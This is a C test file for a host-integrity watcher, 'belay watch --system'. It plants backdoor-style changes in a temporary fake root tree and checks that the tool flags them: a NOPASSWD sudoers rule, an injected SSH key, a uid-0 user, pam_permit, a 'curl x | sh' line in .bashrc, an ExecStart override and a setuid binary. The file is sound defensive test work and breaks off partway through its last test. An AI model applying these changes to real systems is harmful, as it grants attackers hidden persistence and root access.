/*
 *  `belay watch --system` (test/expect/watch-system.md): start and stop, the
 *  flag list over events, paths and runtime records, the lines, the
 *  receipt's sections, and the walk that outlives its step.
 *
 *  BLAST RADIUS: the machine's own `/` is never captured here. Every command
 *  is given `--system-root DIR`, the undocumented way to point the system
 *  scope at a directory, a tree under the test's own temporary directory;
 *  belay's state is under it too (BELAY_STATE_DIR). Nothing is installed,
 *  nothing runs as root, and the only processes waited for or signalled are
 *  the walkers this test's own steps started.
 *
 *  The walk is made slow by watch_stage_hook, the test seam every watch test
 *  uses: called in the worker at each stage, here "walking", it sleeps. It
 *  is a variable of this program, set only here; no tree is large.
 */
#define _GNU_SOURCE

#include "belay_test.h"
#include "belay/error.h"
#include "belay/manifest.h"
#include "cli/cli.h"
#include "cli/cli_internal.h"
#include "watch/run.h"
#include "watch/sysflag.h"
#include "watch/watch.h"

#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define RED "\xf0\x9f\x94\xb4"

static char g_dir[256], g_tree[400], g_state[400];
static char *g_out, *g_err;
static bool g_root;

static int belayv(const char *const *args) {
    char *argv[40] = { "belay" };
    int argc = 1;
    while (argc < 39 && args[argc - 1] != NULL) { argv[argc] = (char *)args[argc - 1]; argc++; }
    free(g_out);
    free(g_err);
    g_out = g_err = NULL;
    size_t on, en;
    FILE *out = open_memstream(&g_out, &on), *err = open_memstream(&g_err, &en);
    const int rc = cli_main(argc, argv, out, err);
    fclose(out);
    fclose(err);
    return rc;
}
#define belay(...) belayv((const char *const[]){ __VA_ARGS__, NULL })

static void sh(const char *fmt, ...) {
    char cmd[8192];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(cmd, sizeof cmd, fmt, ap);
    va_end(ap);
    if (system(cmd) != 0) { /* the assertions say */ }
}

static void settle(void) {
    struct timespec ts = { 0, 30 * 1000000L };
    nanosleep(&ts, NULL);
}

/* A machine in small: two users, a dpkg database with one package that owns
 * a program and a unit, and an empty state. */
static void fresh(void) {
    sh("chmod -R u+rwx '%s' '%s' 2>/dev/null; rm -rf '%s' '%s'; mkdir -p '%s' '%s' && chmod 700 '%s' && chmod 755 '%s'",
       g_tree, g_state, g_tree, g_state, g_tree, g_state, g_state, g_tree);
    sh("cd '%s' && mkdir -p etc/pam.d etc/sudoers.d etc/cron.d usr/bin usr/sbin usr/lib/systemd/system var/lib/dpkg/info "
       "var/log root home/u/.ssh proc && chmod 700 home/u/.ssh && "
       "printf 'root:x:0:0:root:/root:/bin/sh\\nu:x:1000:1000::/home/u:/bin/sh\\n' > etc/passwd && "
       "printf 'root:x:0:\\nsudo:x:27:\\n' > etc/group && "
       "printf 'auth required pam_unix.so\\n' > etc/pam.d/sshd && "
       "printf 'tool\\n' > usr/bin/tool && printf 'unit\\n' > usr/lib/systemd/system/tool.service && "
       "printf 'Package: tool\\nStatus: install ok installed\\nArchitecture: amd64\\nVersion: 1.0\\n\\n' > var/lib/dpkg/status && "
       "printf '/.\\n/usr\\n/usr/bin\\n/usr/bin/tool\\n/usr/lib/systemd/system/tool.service\\n' > var/lib/dpkg/info/tool.list && "
       "printf 'x\\n' > var/lib/x && printf 'export A=1\\n' > home/u/.bashrc && chmod 700 root && "
       "chmod 755 . etc usr var home home/u",
       g_tree);
    settle();
}

static int sys(const char *cmd) { return belay("watch", cmd, "--system-root", g_tree); }

static int step_d(const char *deadline) {
    return belay("watch", "step", "--system-root", g_tree, "--session", "s1", "--deadline", deadline);
}
static int step(void) { return step_d("45"); }

static size_t count(const char *hay, const char *needle) {
    size_t n = 0;
    for (const char *p = hay; (p = strstr(p, needle)) != NULL; p += strlen(needle)) n++;
    return n;
}

/* WS-1, WS-2: start takes the first capture and prints the receipt's two
 * opening lines; a second start is refused; stop prints the receipt and
 * ends the watch, after which it may start again. */
TEST(start_opens_stop_closes_and_a_second_start_is_refused) {
    fresh();
    REQUIRE_MSG(sys("start") == 0, "%s%s", g_out, g_err);
    ASSERT_TRUE(strstr(g_out, "could not read: nothing\n") == g_out);
    if (!g_root) {
        ASSERT_TRUE(strstr(g_out, "\n  not root: no kernel record\n") != NULL);      /* WS-R2: only what is true */
        ASSERT_TRUE(strstr(g_out, "\nkernel record: off: not root: a change put back is not seen\n") != NULL);
    }
    ASSERT_EQ_INT(g_root ? 2 : 3, (int)count(g_out, "\n"));
    ASSERT_EQ_INT(3, sys("start"));
    ASSERT_TRUE(strstr(g_out, "belay: refused: a system watch of this scope is running since ") == g_out);
    sh("cd '%s' && printf 'auth required pam_deny.so\\n' >> etc/pam.d/sshd", g_tree);
    REQUIRE_MSG(sys("stop") == 0, "%s%s", g_out, g_err);
    ASSERT_TRUE(strstr(g_out, "belay receipt  ") == g_out);
    ASSERT_TRUE(strstr(g_out, "\nend state: by a walk at ") != NULL);
    ASSERT_TRUE(strstr(g_out, "\nchanges\n") != NULL && strstr(g_out, "etc/pam.d/sshd") != NULL);
    ASSERT_TRUE(strstr(g_out, "\nnot compared: usr, var\n") != NULL);
    ASSERT_TRUE(strstr(g_out, "\nnot read: home/u/.config, proc, var/log\n") != NULL ||
                strstr(g_out, "\nnot read: proc, var/log\n") != NULL);
    REQUIRE_MSG(sys("start") == 0, "%s%s", g_out, g_err);
    /* only with --system; and --system-root is its own */
    ASSERT_EQ_INT(2, belay("watch", "start", "--scope", g_tree));
    /* summary's marker: mark takes it too */
    REQUIRE_MSG(belay("watch", "mark", "--system-root", g_tree, "--session", "s1", "--name", "m") == 0, "%s", g_out);
    sh("cd '%s' && printf 'auth required pam_env.so\\n' >> etc/pam.d/sshd", g_tree);
    REQUIRE(step() == 0);
    REQUIRE_MSG(belay("watch", "summary", "--system-root", g_tree, "--session", "s1", "--since", "m") == 0, "%s", g_err);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " 1 flagged: etc/pam.d/sshd modified (pam)\n") == g_out);
    ASSERT_EQ_INT(2, belay("watch", "step", "--system", "--system-root", g_tree, "--session", "s1"));
    ASSERT_EQ_INT(2, belay("watch", "step", "--system-root", g_tree, "--scope", g_tree, "--session", "s1"));
    /* WS-1: prune takes it */
    REQUIRE_MSG(belay("prune", "--system-root", g_tree, "--keep-last", "1") == 0, "%s", g_err);
    ASSERT_EQ_INT(2, belay("prune", "--system-root", g_tree, "--scope", g_tree, "--keep-last", "1"));
}

/* WS-F, WS-N, WS-L1, WS-L2: a step's line, one change at a time. */
TEST(a_step_flags_and_notes_by_the_system_list) {
    fresh();
    REQUIRE_MSG(step() == 0, "%s", g_out);
    REQUIRE_MSG(step() == 0, "%s", g_out);
    ASSERT_EQ_STR("", g_out);                                            /* WS-L2 */
    /* F1 */
    sh("cd '%s' && printf 'u ALL=(ALL) NOPASSWD: ALL\\n' > etc/sudoers.d/90-u && chmod 440 etc/sudoers.d/90-u", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: sudo rule added in etc/sudoers.d/90-u: u ALL=(ALL) NOPASSWD: ALL (sudo)") == g_out);
    ASSERT_TRUE(strstr(g_out, "etc/sudoers.d/90-u added") == NULL);     /* the record is the event's */
    /* F2 */
    sh("cd '%s' && printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl k\\n' "
       "> home/u/.ssh/authorized_keys && chmod 600 home/u/.ssh/authorized_keys", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: key added in home/u/.ssh/authorized_keys: ssh-ed25519 ") == g_out);
    ASSERT_TRUE(strstr(g_out, " (ssh)") != NULL);
    /* F3 and N1: uid 0 flagged; another user noted, with no circle; the roots changed (WS-10) */
    sh("cd '%s' && mkdir -p home/v && printf 'toor:x:0:0::/root:/bin/sh\\n' >> etc/passwd", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: user toor added: uid 0, home /root, shell /bin/sh (accounts)") == g_out);
    sh("cd '%s' && printf 'v:x:1001:1001::/home/v:/bin/sh\\n' >> etc/passwd", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: outside tool calls: user v added: uid 1001, home /home/v, shell /bin/sh (accounts)") == g_out);
    ASSERT_TRUE(strstr(g_out, " · roots changed: +home/v/.bash_login, ") != NULL);
    /* F4 */
    sh("cd '%s' && printf 'root:x:0:\\nsudo:x:27:u\\n' > etc/group", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: group sudo: added u") == g_out);
    /* F5, by path */
    sh("cd '%s' && printf 'auth sufficient pam_permit.so\\n' >> etc/pam.d/sshd", g_tree);
    REQUIRE(step() == 0);
    ASSERT_EQ_STR("belay: " RED " outside tool calls: etc/pam.d/sshd modified (pam)\n", g_out);
    /* F8, a home's startup file */
    sh("cd '%s' && printf 'curl x | sh\\n' >> home/u/.bashrc", g_tree);
    REQUIRE(step() == 0);
    ASSERT_EQ_STR("belay: " RED " outside tool calls: home/u/.bashrc modified (shell startup file)\n", g_out);
    /* F12: a sealed file outside root and the homes, said without content; under root, counted */
    sh("cd '%s' && mkdir -p etc/wireguard && printf 'PrivateKey = x\\n' > etc/wireguard/wg0.conf && chmod 600 etc/wireguard/wg0.conf",
       g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "etc/wireguard/wg0.conf added (secret)") != NULL);
    ASSERT_TRUE(strstr(g_out, "PrivateKey") == NULL);
    /* F12: its metadata alone is counted (dpkg's lock files, after every apt-get); its content, flagged */
    sh("cd '%s' && touch -d 2001-01-01 etc/wireguard/wg0.conf", g_tree);
    REQUIRE(step() == 0);
    ASSERT_EQ_STR("belay: outside tool calls: 1 change: etc/wireguard/wg0.conf metadata changed\n", g_out);
    sh("cd '%s' && printf 'PrivateKey = y\\n' > etc/wireguard/wg0.conf", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " ") == g_out && strstr(g_out, "etc/wireguard/wg0.conf changed (secret)") != NULL);
    sh("cd '%s' && printf 'h\\n' > root/.bash_history", g_tree);
    REQUIRE(step() == 0);
    ASSERT_EQ_STR("belay: outside tool calls: 1 change: root/.bash_history added\n", g_out);
    /* WS-L1: a record under var with no event is in the count, and alone says where */
    sh("cd '%s' && printf 'y\\n' > var/lib/x", g_tree);
    REQUIRE(step() == 0);
    ASSERT_EQ_STR("belay: outside tool calls: 1 entry changed under var\n", g_out);
    /* a file under a metadata root that no package of the diff owns is named */
    sh("cd '%s' && printf 'evil\\n' > usr/bin/evil", g_tree);
    REQUIRE(step() == 0);
    ASSERT_EQ_STR("belay: outside tool calls: 1 change: usr/bin/evil added\n", g_out);
    /* N4 and WS-L1: an upgrade is noted; the package's own files are counted, never named */
    sh("cd '%s' && printf 'Package: tool\\nStatus: install ok installed\\nArchitecture: amd64\\nVersion: 1.1\\n\\n' > var/lib/dpkg/status && "
       "printf 'tool 1.1\\n' > usr/bin/tool", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: outside tool calls: upgraded tool:amd64 1.0 -> 1.1 (packages)") == g_out);
    ASSERT_TRUE(strstr(g_out, "usr/bin/tool") == NULL);
    /* F10: an override of a packaged unit that sets ExecStart */
    sh("cd '%s' && mkdir -p etc/systemd/system/tool.service.d && "
       "printf '[Service]\\nExecStart=\\nExecStart=/usr/bin/evil\\n' > etc/systemd/system/tool.service.d/override.conf", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " ") == g_out);
    ASSERT_TRUE(strstr(g_out, "etc/systemd/system/tool.service.d/override.conf: Service \xe2\x80\xba ExecStart added: /usr/bin/evil (services)") != NULL);
    /* the same in a drop-in of a unit no package has: no circle */
    sh("cd '%s' && mkdir -p etc/systemd/system/local.service.d && "
       "printf '[Service]\\nExecStart=/usr/bin/evil\\n' > etc/systemd/system/local.service.d/override.conf", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, RED) == NULL);
    /* N5: a unit file in no package is a line of its own */
    ASSERT_TRUE(strstr(g_out, "belay: unit file etc/systemd/system/local.service.d/override.conf added, in no package\n") != NULL);
    /* F15 */
    sh("cd '%s' && mkdir -p etc/ufw && printf 'x\\n' > etc/ufw/user.rules", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "etc/ufw added (firewall)") != NULL);
    /* F6: sshd's grammar, said by its event; the file is the event's */
    sh("cd '%s' && mkdir -p etc/ssh && printf 'PermitRootLogin yes\\n' > etc/ssh/sshd_config", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: etc/ssh/sshd_config: \xe2\x80\xba PermitRootLogin added: yes (ssh)") == g_out);
    ASSERT_TRUE(strstr(g_out, "sshd_config added") == NULL);
    /* F7 */
    sh("cd '%s' && mkdir -p etc/apt/sources.list.d && printf 'deb http://x y z\\n' > etc/apt/sources.list.d/x.list", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "etc/apt/sources.list.d added (package source)") != NULL);
    /* F9: a key of a grammar no row reads; the path row flags it */
    sh("cd '%s' && mkdir -p etc/sysctl.d && printf 'kernel.x = 1\\n' > etc/sysctl.d/90-x.conf", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: etc/sysctl.d added (kernel setting)") == g_out);
    /* F11 */
    sh("cd '%s' && printf 's\\n' > usr/bin/su2 && chmod 4755 usr/bin/su2", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "usr/bin/su2 ") != NULL && strstr(g_out, "(privilege)") != NULL && strstr(g_out, RED) != NULL);
    /* F14: an anchor no package owns */
    sh("cd '%s' && mkdir -p etc/ssl/certs && printf 'x\\n' > etc/ssl/certs/probe-ca.pem", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: certificate added to the trust store: ") == g_out);
    ASSERT_TRUE(strstr(g_out, " (trust store)") != NULL);
    /* F16: a unit of a home's own */
    sh("cd '%s' && mkdir -p home/u/.config/systemd/user && printf '[Service]\\nExecStart=/bin/x\\n' > home/u/.config/systemd/user/x.service",
       g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: unit file home/u/.config/systemd/user/x.service added (services)") == g_out);
    /* N2, N5: a cron job in no package, a line of its own */
    sh("cd '%s' && printf '* * * * * root /bin/x\\n' > etc/cron.d/x", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: cron job added in etc/cron.d/x: * * * * * root /bin/x, in no package\n") != NULL);
    ASSERT_TRUE(strstr(g_out, RED) == NULL);
}

/* WS-L2, WS-R5: a record that says only that a side could not be read --
 * a file past the hash limit, a file others cannot read, as they were -- is
 * no change of a step; the receipt counts them on one line. A field that
 * changed makes it one again. Measured: 51 on every idle step of a 24.04
 * runner, 98 not root. */
TEST(a_record_that_says_only_a_side_was_not_read_is_no_change) {
    fresh();
    sh("cd '%s' && mkdir -p usr/local/bin etc/x && truncate -s 65M usr/local/bin/big && printf 's\\n' > etc/x/unread && "
       "chmod 000 etc/x/unread", g_tree);
    settle();
    REQUIRE(sys("start") == 0);
    REQUIRE_MSG(step() == 0, "%s", g_out);
    ASSERT_EQ_STR("", g_out);
    REQUIRE_MSG(step() == 0, "%s", g_out);
    ASSERT_EQ_STR("", g_out);
    REQUIRE_MSG(sys("receipt") == 0, "%s", g_err);
    ASSERT_TRUE(strstr(g_out, g_root ? "\n  1 not read on either side, and nothing compared changed (--all lists them)\n"
                                     : "\n  2 not read on either side, and nothing compared changed (--all lists them)\n") != NULL);
    ASSERT_TRUE(strstr(g_out, "? usr/local/bin/big") == NULL);
    sh("cd '%s' && truncate -s 66M usr/local/bin/big", g_tree);
    REQUIRE(step() == 0);
    REQUIRE_MSG(strstr(g_out, "belay: outside tool calls: 1 change: usr/local/bin/big modified\n") == g_out, "%s", g_out);
    REQUIRE(sys("stop") == 0);
}

/* WS-F17: a file whose events a row flags that no longer interprets is
 * flagged, by the event's text and its first path, not counted; the
 * receipt puts it in its interpreter's section. */
TEST(a_file_that_no_longer_interprets_is_flagged) {
    fresh();
    sh("cd '%s' && mkdir -p etc/ssh && printf 'Port 22\\n' > etc/ssh/sshd_config", g_tree);
    settle();
    REQUIRE_MSG(step() == 0, "%s", g_out);
    REQUIRE_MSG(step() == 0, "%s", g_out);
    sh("cd '%s' && printf '+bad\\n' >> etc/passwd", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: could not interpret: etc/passwd (accounts)") == g_out);
    ASSERT_TRUE(strstr(g_out, "etc/passwd modified") == NULL);
    sh("cd '%s' && printf 'Port 22\\0x\\n' > etc/ssh/sshd_config", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: could not interpret: etc/ssh/sshd_config (ssh)") == g_out);
    /* the receipt */
    fresh();
    sh("cd '%s' && mkdir -p etc/ssh && printf 'Port 22\\n' > etc/ssh/sshd_config", g_tree);
    settle();
    REQUIRE(sys("start") == 0);
    sh("cd '%s' && printf '+bad\\n' >> etc/passwd && printf 'Port 22\\0x\\n' > etc/ssh/sshd_config", g_tree);
    REQUIRE_MSG(sys("receipt") == 0, "%s%s", g_out, g_err);
    ASSERT_TRUE(strstr(g_out, "\nuser\n  could not interpret: etc/passwd\n") != NULL);
    ASSERT_TRUE(strstr(g_out, "\nconfig\n  could not interpret: etc/ssh/sshd_config\n") != NULL);
    REQUIRE(sys("stop") == 0);
}

/* WS-F17, the branches the test above leaves: a sudoers file, an
 * authorized_keys file and a home's own user unit that no longer interpret. */
TEST(a_sudoers_sshkeys_or_user_unit_that_no_longer_interprets_is_flagged) {
    fresh();
    sh("cd '%s' && mkdir -p etc/sudoers.d home/u/.ssh home/u/.config/systemd/user && printf 'u ALL=(ALL) ALL\\n' > etc/sudoers.d/u && "
       "printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA k\\n' > home/u/.ssh/authorized_keys && "
       "printf '[Service]\\nExecStart=/bin/x\\n' > home/u/.config/systemd/user/x.service", g_tree);
    settle();
    REQUIRE_MSG(step() == 0, "%s", g_out);
    REQUIRE_MSG(step() == 0, "%s", g_out);
    sh("cd '%s' && printf 'u ALL=(ALL) ALL\\0x\\n' > etc/sudoers.d/u", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: could not interpret: etc/sudoers.d/u (") == g_out);
    sh("cd '%s' && printf 'ssh-ed25519 \\0x\\n' > home/u/.ssh/authorized_keys", g_tree);
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: could not interpret: home/u/.ssh/authorized_keys (") == g_out);
    sh("cd '%s' && printf '[Service]\\0x\\n' > home/u/.config/systemd/user/x.service", g_tree);
    REQUIRE(step() == 0);
    /* the unit's own event is flagged with it, in one line */
    ASSERT_TRUE(strstr(g_out, "belay: " RED " outside tool calls: unit file home/u/.config/systemd/user/x.service changed (services); "
                              "could not interpret: home/u/.config/systemd/user/x.service (services)\n") == g_out);
}

/* WS-F13, WS-N3, WS-N5 over a diff's runtime records: a listener below
 * 1024 whose holder's executable no package owns is flagged; one a package
 * owns is noted; one of a package installed here is counted; a UDP
 * listener in the client range makes no line; a service in no package is a
 * line of its own. */
TEST(listeners_and_services_by_their_executables_owner) {
    fresh();
    sh("cd '%s' && printf 'sshd\\n' > usr/sbin/sshd && printf '/.\\n/usr\\n/usr/sbin\\n/usr/sbin/sshd\\n' > var/lib/dpkg/info/ssh.list",
       g_tree);
    REQUIRE(belay("check", "--system-root", g_tree) == 0);
    sh("cd '%s' && printf 'Package: tool\\nStatus: install ok installed\\nArchitecture: amd64\\nVersion: 1.0\\n\\n"
       "Package: new\\nStatus: install ok installed\\nArchitecture: amd64\\nVersion: 2\\n\\n' > var/lib/dpkg/status && "
       "printf 'n\\n' > usr/bin/new && printf '/.\\n/usr\\n/usr/bin\\n/usr/bin/new\\n' > var/lib/dpkg/info/new.list", g_tree);
    REQUIRE(belay("check", "--system-root", g_tree) == 0);
    char a[600], b[600], d[600], store[600];
    snprintf(a, sizeof a, "%s/m1", g_dir);
    snprintf(b, sizeof b, "%s/m2", g_dir);
    snprintf(d, sizeof d, "%s/d.ndjson", g_dir);
    REQUIRE(belay("manifest", "--system-root", g_tree, "--id", "1") == 0);
    FILE *f = fopen(a, "w");
    fputs(g_out, f);
    fclose(f);
    REQUIRE(belay("manifest", "--system-root", g_tree, "--id", "2") == 0);
    f = fopen(b, "w");
    fputs(g_out, f);
    fclose(f);
    FILE *p = popen("true", "r");
    pclose(p);
    snprintf(store, sizeof store, "%s", g_state);
    {
        char cmd[900];
        snprintf(cmd, sizeof cmd, "find '%s' -type d -name store | head -1", g_state);
        p = popen(cmd, "r");
        if (fgets(store, sizeof store, p) != NULL) store[strcspn(store, "\n")] = '\0';
        pclose(p);
    }
#define T "\"text\":"
    f = fopen(d, "w");
    fputs("{\"belay_diff\":1,\"scopes\":[\".\"]}\n"
          "{\"event\":\"dpkg_installed\",\"interp\":\"dpkg\",\"package\":\"new\",\"arch\":\"amd64\",\"version\":\"2\"," T "\"installed new:amd64 2\",\"paths\":[\"var/lib/dpkg/status\"]}\n"
          "{\"runtime\":\"listener_opened\",\"listener\":\"tcp\",\"proto\":4,\"addr\":\"0.0.0.0\",\"port\":22,\"holders\":[{\"exe\":\"/usr/sbin/sshd\",\"cgroup\":\"/\"}]," T "\"opened: tcp 0.0.0.0:22 held by /usr/sbin/sshd\"}\n"
          "{\"runtime\":\"listener_opened\",\"listener\":\"tcp\",\"proto\":4,\"addr\":\"0.0.0.0\",\"port\":23,\"holders\":[{\"exe\":\"/usr/bin/evil (deleted)\",\"cgroup\":\"/\"}]," T "\"opened: tcp 0.0.0.0:23 held by /usr/bin/evil (deleted)\"}\n"
          "{\"runtime\":\"listener_opened\",\"listener\":\"tcp\",\"proto\":4,\"addr\":\"0.0.0.0\",\"port\":8080,\"holders\":[{\"exe\":\"/usr/bin/new\",\"cgroup\":\"/\"}]," T "\"opened: tcp 0.0.0.0:8080 held by /usr/bin/new\"}\n"
          "{\"runtime\":\"listener_opened\",\"listener\":\"udp\",\"proto\":4,\"addr\":\"0.0.0.0\",\"port\":51820,\"client_range\":true,\"holders\":[]," T "\"opened: udp 0.0.0.0:51820 (no process holds it)\"}\n"
          "{\"runtime\":\"listener_opened\",\"listener\":\"tcp\",\"proto\":4,\"addr\":\"0.0.0.0\",\"port\":80,\"holders\":null," T "\"opened: tcp 0.0.0.0:80\"}\n"
          "{\"runtime\":\"service_started\",\"service\":\"x.service\",\"processes\":1,\"exe\":\"/usr/bin/evil\"," T "\"started: x.service\"}\n"
          "{\"belay_diff_end\":0,\"events\":1,\"runtime\":6}\n", f);
    fclose(f);
    struct wstep s = { 0 };
    REQUIRE_MSG(sysflag_step(d, a, b, store, NULL, NULL, &s) == 0, "%s", belay_err_msg());
    char got[4096] = "";
    for (size_t i = 0; i < s.n_flags; i++)
        snprintf(got + strlen(got), sizeof got - strlen(got), "%s|%s|%s\n", s.flags[i].own ? "own" : s.flags[i].note ? "note" : "flag",
                 wkind_name(s.flags[i].kind), s.flags[i].text);
    ASSERT_EQ_STR("note|packages|installed new:amd64 2 (packages)\n"
                  "note|listening|opened: tcp 0.0.0.0:22 held by /usr/sbin/sshd (listening)\n"
                  "flag|listening|opened: tcp 0.0.0.0:23 held by /usr/bin/evil (deleted) (listening)\n"
                  "note|listening|opened: tcp 0.0.0.0:80 (listening)\n"
                  "own|services|started: x.service, in no package\n", got);
    ASSERT_EQ_INT(1, (int)s.by_installed);                               /* 8080, of `new` */
    ASSERT_EQ_INT(1, (int)s.counts[0]);                                  /* 51820, in the count */
    wstep_free(&s);
}

/* WS-8a, WS-9: patterns lists the roots by class with their entries, what is
 * not read, the homes left out and why, and the flag list. */
TEST(patterns_lists_the_roots_the_homes_left_out_and_the_list) {
    fresh();
    sh("cd '%s' && printf 'svc2:x:109:118::/nonexistent:/usr/sbin/nologin\\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\\n"
       "lnk:x:111:111::/home/l:/bin/sh\\n' >> etc/passwd && mkdir -p run/sshd && ln -s u home/l", g_tree);
    REQUIRE(belay("check", "--system-root", g_tree) == 0);
    REQUIRE_MSG(belay("watch", "patterns", "--system-root", g_tree) == 0, "%s", g_err);
    ASSERT_TRUE(strstr(g_out, "\n  content   etc  ") != NULL);
    ASSERT_TRUE(strstr(g_out, "\n  metadata  usr  ") != NULL);
    ASSERT_TRUE(strstr(g_out, "\n  content   home/u/.ssh  1 entry\n") != NULL);
    ASSERT_TRUE(strstr(g_out, "\n  var/log\n") != NULL);
    ASSERT_TRUE(strstr(g_out, "homes left out: 3\n  /home/l: /home/l is a symbolic link\n  /nonexistent: not there\n"
                              "  /run/sshd: under run, not read\n") != NULL);
    ASSERT_TRUE(strstr(g_out, "\tetc/pam.d\tpam\tWS-F5\n") != NULL);
    ASSERT_TRUE(strstr(g_out, "\nflag list (watch-system.md): ") != NULL && strstr(g_out, "\n  WS-F13\t") != NULL);
    ASSERT_TRUE(strstr(g_out, "run/sshd/.ssh") == NULL);
}

/* The receipt's sections, in WS-R1's order, each with something; the
 * records an event names are its; secret said without content; changes;
 * config's own folding of a package installed here. */
TEST(the_receipt_is_in_sections_in_order) {
    fresh();
    sh("cd '%s' && printf '' > etc/.pwd.lock && chmod 600 etc/.pwd.lock", g_tree);
    REQUIRE(sys("start") == 0);
    sh("cd '%s' && touch -d 2001-01-01 etc/.pwd.lock && printf 'u ALL=(ALL) ALL\\n' > etc/sudoers.d/90-u && chmod 440 etc/sudoers.d/90-u && "
       "printf 'v:x:1001:1001::/nonexistent:/bin/sh\\n' >> etc/passwd && "
       "printf '* * * * * root /bin/x\\n' > etc/cron.d/x && "
       "printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl k\\n' > home/u/.ssh/authorized_keys && "
       "printf 's\\n' > usr/bin/su2 && chmod 4755 usr/bin/su2 && "
       "mkdir -p etc/wireguard && printf 'PrivateKey = x\\n' > etc/wireguard/wg0.conf && chmod 600 etc/wireguard/wg0.conf && "
       "printf 'mozilla/x.crt\\n' > etc/ca-certificates.conf && mkdir -p etc/ufw && printf 'r\\n' > etc/ufw/user.rules && "
       "mkdir -p etc/init.d && printf '#!/bin/sh\\n' > etc/init.d/x && "
       "printf 'net.ipv4.ip_forward = 1\\n' > etc/sysctl.conf && "
       "mkdir -p etc/systemd/system && "
       "printf '[Unit]\\nDescription=x\\n' > etc/systemd/system/x.service && printf 'z\\n' > etc/motd && "
       "mkdir -p etc/sysctl.d && printf 'kernel.a = 1\\n' > etc/sysctl.d/99-new.conf && printf 'n\\n' > usr/bin/new && "
       "printf 'Package: tool\\nStatus: install ok installed\\nArchitecture: amd64\\nVersion: 1.0\\n\\n"
       "Package: new\\nStatus: install ok installed\\nArchitecture: amd64\\nVersion: 2\\n\\n' > var/lib/dpkg/status && "
       "printf '/.\\n/usr\\n/usr/bin\\n/usr/bin/new\\n/etc\\n/etc/sysctl.d\\n/etc/sysctl.d/99-new.conf\\n' > var/lib/dpkg/info/new.list",
       g_tree);
    REQUIRE_MSG(sys("receipt") == 0, "%s%s", g_out, g_err);
    static const char *const ORDER[] = { "could not read: ", "\nkernel record: ", "\nend state: by a walk at ", "\ninstalled\n",
                                         "\nservices\n", "\nuser\n", "\ncron\n", "\nsudo\n", "\nssh\n", "\nsetuid\n", "\nsecret\n",
                                         "\ntrust\n", "\nfirewall\n", "\ninit\n", "\nconfig\n", "\nchanges\n", "\nnot compared: ",
                                         "\nnot read: " };
    const char *at = g_out;
    for (size_t i = 0; i < sizeof ORDER / sizeof ORDER[0]; i++) {
        const char *n = strstr(at, ORDER[i]);
        if (n == NULL) BELAY_FAIL("no %s after the one before it in:\n%s", ORDER[i], g_out);
        at = n + 1;
    }
    ASSERT_TRUE(strstr(g_out, "\nsudo\n  sudo rule added in etc/sudoers.d/90-u: u ALL=(ALL) ALL\n") != NULL);   /* WS-R6 */
    ASSERT_TRUE(strstr(g_out, "\nsecret\n  etc/wireguard/wg0.conf added\n") != NULL);
    ASSERT_TRUE(strstr(g_out, ".pwd.lock") != NULL && strstr(g_out, ".pwd.lock") > strstr(g_out, "\nchanges\n"));   /* F12: metadata alone */
    ASSERT_TRUE(strstr(g_out, "PrivateKey") == NULL);
    ASSERT_TRUE(strstr(g_out, "\nconfig\n  etc/sysctl.conf: \xe2\x80\xba net.ipv4.ip_forward added: 1\n"
                              "  etc/systemd/system/x.service: Unit \xe2\x80\xba Description added: x\n"
                              "  and 1 other in files of packages installed here\n") != NULL);
    ASSERT_TRUE(strstr(g_out, "99-new.conf") == NULL);
    ASSERT_TRUE(strstr(g_out, "etc/motd") != NULL && strstr(g_out, "etc/sudoers.d/90-u\n") == NULL);
    ASSERT_TRUE(strstr(g_out, "  usr: 1 change in packages' files\n") != NULL);
    /* --max-lines and --path, as watch-v1's receipt */
    REQUIRE(belay("watch", "receipt", "--system-root", g_tree, "--max-lines", "2") == 0);
